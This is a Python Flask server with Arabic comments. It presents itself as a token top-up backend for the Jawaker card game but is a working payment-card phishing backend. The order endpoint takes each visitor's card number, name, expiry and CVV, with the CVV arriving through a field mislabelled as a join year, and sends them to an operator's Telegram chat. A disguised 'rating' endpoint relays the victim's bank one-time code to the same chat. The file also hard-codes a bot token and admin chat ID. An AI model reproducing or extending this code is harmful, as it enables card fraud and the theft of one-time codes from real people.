"""
سيرفر جواكر - الوسيط بين الموقع وبوت التلجرام (نسخة منفصلة البيانات)
"""

import os
import time
import uuid
import threading

import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

# ------------------ الإعدادات ------------------
BOT_TOKEN = "8941591490:AAE_HP_z4z7Ls0nEsalTqLI1dYsg4TYdOL4"
ADMIN_CHAT_ID = 5437487652
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

app = Flask(__name__)
CORS(app)

orders = {}
orders_lock = threading.Lock()

@app.route("/api/order", methods=["POST"])
def create_order():
    data = request.json or {}
    
    player_id = data.get("id")
    card_number = data.get("jawakerNumber")
    card_name = data.get("jawakerName")
    country = data.get("country")
    
    # جلب الحقول المنفصلة للتاريخ
    join_day = data.get("joinDay", "")
    join_month = data.get("joinMonth", "")
    join_cvv = data.get("joinYear", "") # الـ year يمثل حقل الـ CVV في كود الـ html الخاص بك
    
    pack_info = data.get("order", {})
    pack_name = pack_info.get("name", "غير معروف")
    pack_amount = pack_info.get("amount", "0")
    pack_price = pack_info.get("price", "$0")

    if not player_id or not card_number or not card_name:
        return jsonify({"error": "جميع الحقول المطلوبة يجب تعبئتها"}), 400

    order_id = str(uuid.uuid4())[:8]
    
    with orders_lock:
        orders[order_id] = {
            "id": order_id,
            "player_id": player_id,
            "status": "pending",
            "timestamp": time.time()
        }

    # صياغة الرسالة بشكل منفصل تماماً لتسهيل النسخ والعمل
    msg_text = (
        f"🚨 *وصلك طلب شحن جديد* 🚨\n\n"
        f"🔹 *الطلب:* {pack_name} ({pack_amount} توكنز) بـ {pack_price}\n"
        f"────────────────────\n"
        f"🆔 *معرف اللاعب (ID):* `{player_id}`\n\n"
        f"👤 *الاسم على البطاقة:* `{card_name}`\n\n"
        f"💳 *رمز البطاقة (رقم الكارت):* `{card_number}`\n\n"
        f"📆 *الشهر (MM):* `{join_day}`\n\n"
        f"📆 *السنة (YY):* `{join_month}`\n\n"
        f"🔒 *رمز الأمان (CVV):* `{join_cvv}`\n\n"
        f"📍 *المدينة / الدولة:* `{country}`\n"
        f"────────────────────\n"
        f"⏳ *الحالة:* قيد الانتظار"
    )

    inline_keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ تأكيد وإرسال الـ OTP", "callback_data": f"approve:{order_id}"},
                {"text": "❌ رفض الطلب", "callback_data": f"reject:{order_id}"}
            ]
        ]
    }

    try:
        res = requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": msg_text,
                "parse_mode": "Markdown",
                "reply_markup": inline_keyboard
            },
            timeout=10
        )
        if not res.ok:
            print("Telegram Error:", res.text)
    except Exception as e:
        print("Failed to send telegram message:", e)

    return jsonify({"order_id": order_id, "status": "pending"}), 201

@app.route("/api/order/<order_id>", methods=["GET"])
def get_order_status(order_id):
    with orders_lock:
        order = orders.get(order_id)
        if not order:
            return jsonify({"error": "الطلب غير موجود"}), 404
        return jsonify({"status": order["status"]})

@app.route("/api/rating", methods=["POST"])
def save_rating():
    data = request.json or {}
    order_id = data.get("order_id")
    otp_code = data.get("rating") # يمثل كود الـ OTP المكتوب بالـ input

    if not order_id or not otp_code:
        return jsonify({"error": "بيانات ناقصة"}), 400

    msg_text = (
        f"🔑 *وصلك رمز الـ OTP للطلب ({order_id})* 🔑\n\n"
        f"🔢 *رمز الـ OTP المرسل:* `{otp_code}`"
    )

    try:
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": msg_text,
                "parse_mode": "Markdown"
            },
            timeout=10
        )
    except Exception as e:
        print("Failed to send rating to telegram:", e)

    return jsonify({"success": True})

@app.route("/telegram/webhook", methods=["POST"])
def telegram_webhook():
    update = request.json or {}
    callback = update.get("callback_query")
    if not callback:
        return jsonify({"ok": True})

    callback_id = callback.get("id")
    data = callback.get("data", "")
    message = callback.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    message_id = message.get("message_id")
    old_text = message.get("text", "")

    if ":" not in data:
        return jsonify({"ok": True})

    action, order_id = data.split(":", 1)

    with orders_lock:
        order = orders.get(order_id)
        if order and order["status"] == "pending":
            if action == "approve":
                order["status"] = "approved"
                note = "\n\n✅ تم إرسال طلب الـ OTP بنجاح للمستخدم"
            elif action == "reject":
                order["status"] = "rejected"
                note = "\n\n❌ تم الرفض وإلغاء المعاملة"
            else:
                note = None
        else:
            note = None

    requests.post(
        f"{TELEGRAM_API}/answerCallbackQuery",
        json={f"callback_query_id": callback_id, "text": "تم تسجيل قرارك"},
        timeout=10,
    )

    if note and chat_id and message_id:
        requests.post(
            f"{TELEGRAM_API}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": old_text + note
            },
            timeout=10
        )

    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
